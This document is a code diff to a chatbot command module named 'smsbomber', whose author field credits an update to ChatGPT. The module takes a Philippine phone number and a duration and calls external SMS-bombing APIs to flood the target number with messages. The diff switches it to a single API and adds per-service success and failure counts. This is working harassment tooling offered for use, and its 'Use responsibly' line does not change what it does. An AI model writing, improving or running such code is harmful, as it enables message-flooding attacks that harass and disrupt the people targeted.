@@ -3,9 +3,9 @@ const axios = require("axios");
 module.exports = {
   config: {
     name: "smsbomber",
-    version: "1.0.5",
+    version: "1.0.6",
     author: "vernex + updated by ChatGPT",
-    description: "Send SMS to PH numbers only using two APIs sequentially",
+    description: "Send SMS to PH numbers only using Haji Mix API",
     cooldowns: 10,
     dependencies: {
       axios: ""
@@ -42,58 +42,44 @@ module.exports = {
 
     try {
       await api.sendMessage(
-        `📡 Bombing ${phone} for ${amount} seconds using both APIs...`,
+        `📡 Bombing ${phone} for ${amount} seconds using Haji Mix API...`,
         threadID,
         messageID
       );
 
-      const api1 = `https://haji-mix.up.railway.app/api/smsbomber?phone=${encodeURIComponent(phone)}&times=${amount}`;
-      const api2 = `https://smsbomb-nethws3.up.railway.app/bomb?number=${encodeURIComponent(phone)}&seconds=${amount}`;
-
+      const apiUrl = `https://haji-mix.up.railway.app/api/smsbomber?phone=${encodeURIComponent(phone)}&times=${amount}`;
       let messages = [];
 
-      // --- API 1 ---
+      // --- Haji Mix API ---
       try {
-        const response1 = await axios.get(api1);
-        const data1 = response1.data;
+        const response = await axios.get(apiUrl);
+        const data = response.data;
 
-        if (data1.status !== false) {
+        if (data.status) {
+          const { total_success, total_failed, services } = data.details;
+
+          let serviceStats = Object.entries(services)
+            .map(([name, stats]) => `🔹 ${name}: ✅ ${stats.success} | ❌ ${stats.failed}`)
+            .join("\n");
+
           messages.push(`
-════『 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 - API 1 (Haji Mix) 』════
+════『 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 - Haji Mix 』════
 
 📞 Target: ${phone}
-📨 Amount: ${amount} SMS
-✅ Status: Success
+⏱ Duration: ${amount} seconds
+✅ Success: ${total_success}
+❌ Failed: ${total_failed}
+
+📋 Service Stats:
+${serviceStats}
 
 > Use responsibly.
           `.trim());
         } else {
-          messages.push(`❌ API 1 failed: ${data1.message || "No response message"}`);
+          messages.push(`❌ Haji Mix API failed: ${data.message || "Unknown error"}`);
         }
-      } catch (err1) {
-        messages.push(`⚠️ API 1 failed: ${err1.message}`);
-      }
-
-      // --- API 2 ---
-      try {
-        const response2 = await axios.get(api2);
-        const data2 = response2.data;
-
-        if (data2.message && data2.message.toLowerCase().includes("success")) {
-          messages.push(`
-════『 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 - API 2 (NetHWS3) 』════
-
-📞 Target: ${data2.number}
-⏱ Duration: ${data2.seconds}
-✅ Status: ${data2.message}
-
-> Use responsibly.
-          `.trim());
-        } else {
-          messages.push(`❌ API 2 response: ${data2.message || "Unknown error"}`);
-        }
-      } catch (err2) {
-        messages.push(`⚠️ API 2 failed: ${err2.message}`);
+      } catch (err) {
+        messages.push(`⚠️ Failed to connect to Haji Mix API: ${err.message}`);
       }
 
       // Final output
